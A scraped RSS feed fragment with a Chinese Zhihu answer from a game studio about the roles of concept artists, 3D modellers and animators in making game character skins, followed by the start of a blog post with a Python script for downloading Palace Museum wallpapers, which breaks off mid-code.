src=\"https://pic4.zhimg.com/v2-423eff733ae0a9d730da2ac1b1fc4c16_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"882\" data-watermark=\"original\" data-original-src=\"v2-423eff733ae0a9d730da2ac1b1fc4c16\" data-watermark-src=\"v2-31173dd299ffa14a5cb724a5ebb39078\" data-private-watermark-src=\"v2-8f2a5b334e899fb8b0483c375d34d7e5\"></p>\n<p>但其实这是美宣图。</p>\n<p><b>真实的原画是类似这样的：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-330330edcb013ba10b9d50c404f54e0f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1127\" data-rawheight=\"556\" data-watermark=\"original\" data-original-src=\"v2-330330edcb013ba10b9d50c404f54e0f\" data-watermark-src=\"v2-db4adb4044c2c1639890cbcc74b1fbd3\" data-private-watermark-src=\"v2-d43b9252c96f041c44355cc64c480bbc\"></p>\n<p>这样的：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-52d7c374482e78bb09536ef7bd953396_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1013\" data-rawheight=\"432\" data-watermark=\"original\" data-original-src=\"v2-52d7c374482e78bb09536ef7bd953396\" data-watermark-src=\"v2-0ed719e051b8b0efeb5ba332b1de101b\" data-private-watermark-src=\"v2-5f5d0d99669cfa812604b309b743cfe7\"></p>\n<p><b>美宣顾名思义，</b></p>\n<p><b>一般是用于市场宣传，展现吸引力的精美海报，</b></p>\n<p><b>因此情景完整，神态丰富，重在“画工”</b></p>\n<p><br></p>\n<p><b>原画则往往是美术研发的第一步，</b></p>\n<p><b>更像一张施工图或设计稿，</b></p>\n<p><b>重在发挥想象力和创意的“设计”</b></p>\n<p><br></p>\n<p>为了便于后续3D建模、动画、特效等环节的参考，</p>\n<p>原画的人物姿势不必复杂，</p>\n<p><b>而是以正、侧、背面的三视图为主，</b></p>\n<p><b>将武器、服装、配饰、材质等设定交代分明，</b></p>\n<p>跟美宣的对外功能是十分不同的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0ae26e8e9312a9e9ab48b27130267376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1506\" data-rawheight=\"307\" data-watermark=\"original\" data-original-src=\"v2-0ae26e8e9312a9e9ab48b27130267376\" data-watermark-src=\"v2-c0021471880e2713e5371a99ebbbb96d\" data-private-watermark-src=\"v2-e9e9b731cbc38f4d0cf10cda0f93d974\"></p>\n<p><b>虽说是创意设计，</b></p>\n<p><b>但原画师并不能随心所欲,</b></p>\n<p><b>完全按自身风格和审美去发挥，</b></p>\n<p><b>而是要适应一套严谨的设计流程。</b></p>\n<p><br></p>\n<p>研发一款皮肤前，</p>\n<p>策划、美术、运营、音频等成员会先展开几轮脑暴会，</p>\n<p>提出潜在的主题提案，</p>\n<p>讨论（chǎo jià）出是否有足够的创意空间和独特亮点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1121ec988485ac9f04b92db569d4608c_720w.gif?rss\" data-caption=\"其实没那么夸张，还是比较和谐的，同秃与共\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"385\" data-watermark=\"original\" data-original-src=\"v2-1121ec988485ac9f04b92db569d4608c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如果提案得到一致通过，</p>\n<p>世界观架构师就会输出一版文案，</p>\n<p>定下皮肤主题、人设、故事与台词，</p>\n<p>而原画师围绕这些文字展开想象，</p>\n<p>构思如何用视觉语言呈现出来。</p>\n<p><br></p>\n<p><b>但在面对不熟悉的主题或风格时，</b></p>\n<p><b>原画师有时也会感到无从下手，</b></p>\n<p><b>甚至陷入卡壳的状态</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-628964dbe8259ac396ff8df4b695fe21_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"112\" data-watermark=\"original\" data-original-src=\"v2-628964dbe8259ac396ff8df4b695fe21\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了寻找灵感，</p>\n<p>原画师会解构主题，</p>\n<p>拆解出关键词，</p>\n<p>并尽可能查阅资料，</p>\n<p>比如看书、看视频、浏览艺术网站，</p>\n<p>变身列文虎克，</p>\n<p>罗列出可融入的视觉元素。</p>\n<p><b>风险是随时可能被当成在上班摸鱼。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-71b803825be93400ff9e403cc6b2a8f3_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"390\" data-watermark=\"original\" data-original-src=\"v2-71b803825be93400ff9e403cc6b2a8f3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>当然，</b></p>\n<p><b>有时信息太多和信息太少都是同等灾难。</b></p>\n<p>原画师可能被淹没各种元素中，</p>\n<p>或陷入左右互搏的思绪里，</p>\n<p>时间却在飞速流逝，DDL迫近。</p>\n<p><br></p>\n<p><b>这时要赶紧对元素进行提炼，</b></p>\n<p><b>避免停留在完美主义发作的构思阶段。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-54f85904bf5face6bcc995d0b4e18ef9_720w.jpg?rss\" data-caption=\"再次卡稿的原画师\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"332\" data-watermark=\"original\" data-original-src=\"v2-54f85904bf5face6bcc995d0b4e18ef9\" data-watermark-src=\"v2-37ee9c0de7153ab9703427cb8524344e\" data-private-watermark-src=\"v2-c93dbc9f998ba6dddf1e3bcdc793cdba\"></p>\n<p>经过一番提炼取舍，</p>\n<p>原画师开始动手绘制，</p>\n<p><b>结合对角色气质、体型、玩法、游戏内效果等考虑，</b></p>\n<p><b>将视觉元素融入到皮肤设计中，</b></p>\n<p><b>并推出几版配色方案，</b></p>\n<p><b>及时与团队交流并推进。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6258288db5e6d8d90efb0b0bf29d11b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1817\" data-rawheight=\"739\" data-watermark=\"original\" data-original-src=\"v2-6258288db5e6d8d90efb0b0bf29d11b8\" data-watermark-src=\"v2-799f8ce0f157f7a80a87baf65d6495fd\" data-private-watermark-src=\"v2-5e27fbefc0120fd93444fc0a5c9c039f\"></p>\n<p><b>对于一些内行的命题，</b></p>\n<p><b>仅凭原画师自己难以保证效果，</b></p>\n<p><b>也会寻求专业支持。</b></p>\n<p><br></p>\n<p>比如<a href=\"https://www.zhihu.com/question/350341955/answer/940622972\" class=\"internal\">“上官婉儿·梁祝”皮肤的设计</a>，</p>\n<p>就与浙江小百花越剧团深度合作；</p>\n<p>而在<a href=\"https://www.zhihu.com/question/35424434/answer/1266262943\" class=\"internal\">“杨玉环·遇见飞天”的皮肤设计</a>中，</p>\n<p>团队飞往敦煌实地考察，</p>\n<p>得到了敦煌研究院的专家指导。</p>\n<p>在一版版推倒重来的打磨后，</p>\n<p>才得到“有神了”的认可。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8456ff561d9f9cbba7e456996b644ba3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1507\" data-rawheight=\"415\" data-watermark=\"original\" data-original-src=\"v2-8456ff561d9f9cbba7e456996b644ba3\" data-watermark-src=\"v2-9066c7daa137d033824f849228ce9567\" data-private-watermark-src=\"v2-249438707953f78bd00c79b9869d8b83\"></p>\n<p><b>有时原画看似不如美宣华丽，</b></p>\n<p><b>但背后也是一场漫长的心智马拉松。</b></p>\n<p><br></p>\n<p>所以如果看到身边的原画师两眼无神，</p>\n<p>发际线日益稀疏，</p>\n<p>那一定是正在绞尽脑汁，</p>\n<p>努力摆脱日常卡稿的状态。</p>\n<p>请大家一定珍爱身边的原画师，</p>\n<p>比如从请TA喝奶茶做起。</p>\n<p><br></p>\n<p><b>至于“原画师和建模师会不会打架？”的历史难题，</b></p>\n<p><b>还是请建模师回答吧！</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3c12ff02d187ac388544df05e23197bd_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"172\" data-rawheight=\"202\" data-watermark=\"original\" data-original-src=\"v2-3c12ff02d187ac388544df05e23197bd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常背锅的建模师：</b></h2>\n<p><br></p>\n<p><b>有人会吐槽说建模和原画，</b></p>\n<p><b>就是买家秀和卖家秀的区别，</b></p>\n<p><b>也是导致原画和建模打架的根源。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-59c46bf7141ceca60dba0e831c0a527e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"220\" data-rawheight=\"220\" data-watermark=\"original\" data-original-src=\"v2-59c46bf7141ceca60dba0e831c0a527e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真相真不是那么简单！</b></p>\n<p><b>请听听我的狡辩。</b></p>\n<p><br></p>\n<p><b>职能上简单来说，</b></p>\n<p><b>建模师负责根据原画师的2D设计图，</b></p>\n<p><b>精准制作成3D模型，</b></p>\n<p><b>并放在游戏引擎里完成效果调试。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-65285c10dfc408ec007ae1e32f394817_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"409\" data-watermark=\"original\" data-original-src=\"v2-65285c10dfc408ec007ae1e32f394817\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>大家可以想象一下捏黏土，</p>\n<p>没有足够经验的人，</p>\n<p>即使用灵活的双手和工具，</p>\n<p>对着实物参照，</p>\n<p>也很容易把泥塑捏得画风崩坏。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4284c59f59165fdfa5353485b31b4d01_720w.jpg?rss\" data-caption=\"比如有名的“邪神手办”\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"487\" data-watermark=\"original\" data-original-src=\"v2-4284c59f59165fdfa5353485b31b4d01\" data-watermark-src=\"v2-893daa03596ca823074c4d783ec34990\" data-private-watermark-src=\"v2-85c6d751b65e06f26f04bfbd59512a36\"></p>\n<p>而3D建模大多是在复杂的专业软件上操作</p>\n<p>参照2D平面原画去进行3D立体还原。</p>\n<p><b>由于平面存在角度遮挡和部分视野盲区，</b></p>\n<p><b>也更考验建模师运用自己的空间想象力，</b></p>\n<p><b>或专业的人体和服饰结构知识来补齐</b>。</p>\n<p><br></p>\n<p><b>所以简单来说，建模真的很不简单！！！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-42aceacdf465bc1bf1f1dd3711ab5aac_720w.jpg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"690\" data-rawheight=\"670\" data-watermark=\"original\" data-original-src=\"v2-42aceacdf465bc1bf1f1dd3711ab5aac\" data-watermark-src=\"v2-a4f72bcb03405dd39807dc809794c323\" data-private-watermark-src=\"v2-97760711a7e3b35d1098c6850a0e9859\"></p>\n<p><b>首先是局外模型的搭建。</b></p>\n<p><b>局外建模是一个由简到繁，又由繁到简的过程。</b></p>\n<p>建模师会先研究原画设计中的身型和结构，</p>\n<p>捏出一个大致轮廓，也称粗模。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5c19445ea03ac64bbce9ecbae356ee01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1515\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-5c19445ea03ac64bbce9ecbae356ee01\" data-watermark-src=\"v2-529ab8d4f47e37846e094150f35ded55\" data-private-watermark-src=\"v2-44a8cb55e6664a217816529f059aabff\"></p>\n<p>在粗模的基础上，</p>\n<p>建模师继续使用ZBrush等专业工具，</p>\n<p>对粗模精雕细琢，</p>\n<p>打造出一个高面数的模型，</p>\n<p>也即由简到繁。</p>\n<p><br></p>\n<p><b>面数指的是构成模型的面的数量，</b></p>\n<p><b>面数越高，面越小，模型表面就越是光滑细腻。</b></p>\n<p><b>一个高精度模型的面数就可能超过一千万，</b></p>\n<p><b>这会给设备的处理性能带去极大负担。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c2bef30b87bbe19088814e32b10cc8a1_720w.gif?rss\" data-caption=\"高精度模型放大后的面数细节\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-c2bef30b87bbe19088814e32b10cc8a1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>因此，在将模型放入游戏内之前，</p>\n<p><b>建模师要对高精度模型进行一个由繁到简的处理。</b></p>\n<p><b>这一工序也就是烘焙。</b></p>\n<p><br></p>\n<p><b>烘焙时，建模师会调出一个低面数的模型，</b></p>\n<p><b>用于包裹原先的高面数模型，</b></p>\n<p><b>通过软件计算和映射，</b></p>\n<p><b>较低面数的模型也能模拟出高面数的效果，</b></p>\n<p><b>从而减轻手机的性能负担，让画面更加流畅。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-700e68eccd049f9c97bba2d5e9bff14a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-700e68eccd049f9c97bba2d5e9bff14a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>可能部分玩家会认为游戏内建模不够精细，</p>\n<p><b>但在适配手机性能的前提下，</b></p>\n<p><b>烘焙和降低面数其实是必不可少的处理！</b></p>\n<p><br></p>\n<p><b>在对烘焙后的模型进行精修后，</b></p>\n<p><b>建模师会转战专门的贴图软件，</b></p>\n<p>给模型上色，并添加相应的材质效果，</p>\n<p>让模型显得更加完整逼真。</p>\n<p><br></p>\n<p><b>最后是渲染环节。</b></p>\n<p><b>简单来说，</b></p>\n<p><b>渲染就是通过控制模型和场景的灯光氛围，</b></p>\n<p><b>对材质效果进行品质上的进一步提升，</b></p>\n<p>再配合上动画、特效等元素，</p>\n<p>就有了栩栩如生的3D动态角色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bd1a90e7488c0f19fb206ab4e936fc4f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-bd1a90e7488c0f19fb206ab4e936fc4f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>一般而言，在完整的研发流程中，</b></p>\n<p><b>3D建模花费的时间总是最长的，</b></p>\n<p>再加上打磨细节和加入动态物理PRB材质等优化工序，</p>\n<p>往往需要十几天，</p>\n<p>可见整个流程的漫长繁琐。</p>\n<p><br></p>\n<p><b>因为建模是直接应用在游戏内的物体，</b></p>\n<p><b>还需要搭配动画、特效、程序技术等复杂的开发过程，</b></p>\n<p><b>也就是说，建模除了尽可能还原原画设计，</b></p>\n<p><b>更要考虑实际的应用层面，</b></p>\n<p><b>尤其是在手机上的运行表现，</b></p>\n<p><b>因此不可避免地要做出一些取舍。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3b035a1d9e99336a3721fd71a64b3919_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"284\" data-watermark=\"original\" data-original-src=\"v2-3b035a1d9e99336a3721fd71a64b3919\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>所以，对于“原画师和建模师会不会打架”的难题。</p>\n<p>答案其实是“不会”。</p>\n<p><b>虽然有时原画和建模会为了细节的取舍而激烈讨论，</b></p>\n<p><b>但都是希望能做出更好的呈现效果，</b></p>\n<p><b>正面讨论也有利于解决问题和优化方案。</b></p>\n<p><br></p>\n<p>随着未来研发技术的不断发展，</p>\n<p>比如更好的渲染引擎、更精致的贴图、更真实的光照技术</p>\n<p>原画和建模总会更容易达成共识的吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1370bc70cbb9f36a8548f0ea4a1e9c88_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"360\" data-watermark=\"original\" data-original-src=\"v2-1370bc70cbb9f36a8548f0ea4a1e9c88\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常“变形”的动画师：</b></h2>\n<p><br></p>\n<p><b>亲爱的朋友们，</b></p>\n<p><b>不知你们看过“学了三年动画”系列吗？</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-417db7861370cae51675057deb79f4fa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"213\" data-rawheight=\"178\" data-watermark=\"original\" data-original-src=\"v2-417db7861370cae51675057deb79f4fa\" data-watermark-src=\"v2-23fa536af29ce8a752be62d86249b771\" data-private-watermark-src=\"v2-2f0630f59e54f5a182e0eefa1ebf80a0\"></p>\n<p><b>写到这里，我的privilege已经尽数体现了。</b></p>\n<p><b>没错，最苦的人是我。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef9d98020c5808e1add650766889e9d9_720w.gif?rss\" data-caption=\"“学了三年动画”系列，虽然部分是为了搞笑效果，但一定程度上体现了3D动画的不容易  图源：B站MAX-小仙女\" data-size=\"normal\" data-rawwidth=\"784\" data-rawheight=\"378\" data-watermark=\"original\" data-original-src=\"v2-ef9d98020c5808e1add650766889e9d9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>从职能上来说，</b></p>\n<p><b>角色动画师的职责是“赋予角色灵魂”，</b></p>\n<p><b>也就是根据设定</b></p>\n<p><b>设计角色在游戏中的行为动作与表情表演，</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2fb1ed3156aa53375210f3b70aeb7481_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-2fb1ed3156aa53375210f3b70aeb7481\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>刚完成的建模就像一个木偶，</b></p>\n<p><b>而动画师为木偶赋予骨架和灵活的关节，</b></p>\n<p><b>并通过软件连上看不见的线，</b></p>\n<p><b>用一套动作使木偶变得生动起来。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"615\" data-rawheight=\"317\" data-watermark=\"original\" data-original-src=\"v2-4c3b4ac775b16f4e5e4dfc3edaec3bb4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>成套动作的设计是展现角色个性的关键。</b></p>\n<p>因此在设计之初，</p>\n<p>团队成员同样会展开脑暴会议，</p>\n<p>讨论并进行多轮提案，</p>\n<p>而动画师会根据这些提案去制作出多版可视化设计稿，</p>\n<p>也被称为动作示意。</p>\n<p><br></p>\n<p>在动作示意环节，</p>\n<p><b>动画师首先会利用建模师提供的粗模来进行绑定蒙皮，</b></p>\n<p><b>也就是为皮肤模型搭建一个完整的骨架，</b></p>\n<p><b>并将骨架嵌入到皮肤模型里，</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-52627a55e4c3ed72266dc000aec634d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1429\" data-rawheight=\"771\" data-watermark=\"original\" data-original-src=\"v2-52627a55e4c3ed72266dc000aec634d0\" data-watermark-src=\"v2-b5ec4380fce208c7955918340cd3d7ca\" data-private-watermark-src=\"v2-f882d6bac663d140bad9ffaa2f1603e1\"></p>\n<p><b>经过绑定蒙皮，</b></p>\n<p><b>模型也就有了动起来的可能。</b></p>\n<p>此时的动作示意仍是比较粗糙生硬的，</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6f7c4d2feabe203a23d87fe86646162b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-6f7c4d2feabe203a23d87fe86646162b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>但在经过团队成员投票通过之后，</p>\n<p><b>动画师就会将粗模替换成最终模型，</b></p>\n<p><b>进入更细致的动作打磨环节。</b></p>\n<p><br></p>\n<p>在这一环节，</p>\n<p>动画师先要考虑的是，</p>\n<p>如何让角色的一举一动符合逻辑，</p>\n<p>符合背景故事设定，</p>\n<p><b>因此动画师会配合场景师，</b></p>\n<p><b>为动作构建一个合适的舞台环境，</b></p>\n<p><b>进一步去考虑登场动作的表演细节</b></p>\n<p><b>以及动作衔接的流畅自然</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-ce1a3d1ef5fa1c233e6e6f98ea9135a6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>所谓动作衔接的流畅自然</b></p>\n<p><b>也就是角色的运动符合人体动力学，</b></p>\n<p><b>不会给人一种违和感，</b></p>\n<p><b>即使是卡通风格，</b></p>\n<p><b>也要结合科学常识进行艺术加工。</b></p>\n<p><br></p>\n<p>比如当一个角色从高空中落地</p>\n<p>如果没有一个自然的身体起伏作为缓冲，</p>\n<p>也显然是不符合常识的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4081201f0bd1a5100987e5d9844ce027_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"673\" data-rawheight=\"356\" data-watermark=\"original\" data-original-src=\"v2-4081201f0bd1a5100987e5d9844ce027\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这些自然生动的细节，</b></p>\n<p><b>都十分考验动画师的阅历和想象力。</b></p>\n<p><br></p>\n<p>遇到专业领域的武术和舞蹈动作，</p>\n<p>动画师也要寻找大量的参考资料，</p>\n<p>在专业软件中不断进行模拟，</p>\n<p>才能编排出一段逼真的动作演绎。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-24de7752fb19a2610d51de7c2c93d578_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-24de7752fb19a2610d51de7c2c93d578\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>有时，动画师也会借助真人动作捕捉技术，</b></p>\n<p><b>来制作写实风格的动画。</b></p>\n<p><br></p>\n<p>比如“上官婉儿·梁祝”皮肤，</p>\n<p>就邀请了越剧专家进行表演，</p>\n<p>并通过光学动捕，</p>\n<p>将真人动作复刻到皮肤模型上，</p>\n<p><img src=\"https://pic2.zhimg.com/v2-50ab030a995ba6e608ff8980a41d5805_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"373\" data-watermark=\"original\" data-original-src=\"v2-50ab030a995ba6e608ff8980a41d5805\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>除了肢体动作，</b></p>\n<p><b>面部表情对增强感染力同样至关重要。</b></p>\n<p><br></p>\n<p>比如在“程咬金·功夫厨神”的动作中，</p>\n<p>动画师就加入了享受、陶醉、自信等六个表情，</p>\n<p>结合人物浮夸的动作，</p>\n<p>增强表现的真实性和趣味性。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6eef0527064bcba3fa2c57215573f2e0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"406\" data-watermark=\"original\" data-original-src=\"v2-6eef0527064bcba3fa2c57215573f2e0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>随着技术的进步与表现技法的迭代</b></p>\n<p><b>动画师也会运用影视化的镜头语言，</b></p>\n<p>比如镜头的推拉摇移，</p>\n<p>场景的分切组接，</p>\n<p><b>从最佳方位来展现模型和动作的美感，</b></p>\n<p><b>增强叙事的沉浸感</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ee1531a5df0cbd362c5be5f08d50f780_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"727\" data-rawheight=\"331\" data-watermark=\"original\" data-original-src=\"v2-ee1531a5df0cbd362c5be5f08d50f780\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>综上，</b></p>\n<p><b>要想成为一名游戏角色动画师，</b></p>\n<p><b>最好需要：</b></p>\n<p>足够的美术素养、</p>\n<p>动画节奏感、</p>\n<p>2D、3D引擎制作经验、</p>\n<p>较强的自学能力、</p>\n<p>表演艺术经验、</p>\n<p>Maya、3dmax、MotionBuilder等软件知识、</p>\n<p>对动捕技术的了解</p>\n<p>......</p>\n<p><br></p>\n<p>不提了，又得去学技术了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-10609283503d273e2ab5df0d83f831d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"205\" data-rawheight=\"234\" data-watermark=\"original\" data-original-src=\"v2-10609283503d273e2ab5df0d83f831d9\" data-watermark-src=\"v2-270f00905e7b9a300020511551b963ed\" data-private-watermark-src=\"v2-2f175bf4aa6e044f8f78c0bc6b40e63a\"></p>\n<p>后续还有关于特效设计师、UI设计师、美宣设计师的故事，</p>\n<p>视反响持续更新！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-97fe54cb99adf840f79b4a1e87eba033_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"219\" data-rawheight=\"211\" data-watermark=\"original\" data-original-src=\"v2-97fe54cb99adf840f79b4a1e87eba033\" data-watermark-src=\"v2-ba681b6a7826e37dbb51666272c392ad\" data-private-watermark-src=\"v2-5595038ecc466fdcf37adbcf3f8f3744\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tian-mei-gong-zuo-shi-21?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">腾讯天美工作室群</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">50 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/449240443?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在小型游戏公司做原画有意义吗?</a><br><a href=\"http://www.zhihu.com/question/315849150?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在学场景原画还是学好3D工作稳定了再学场景原画呢？</a><br>\n","link":"http://www.zhihu.com/question/356482357/answer/2002965423?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span 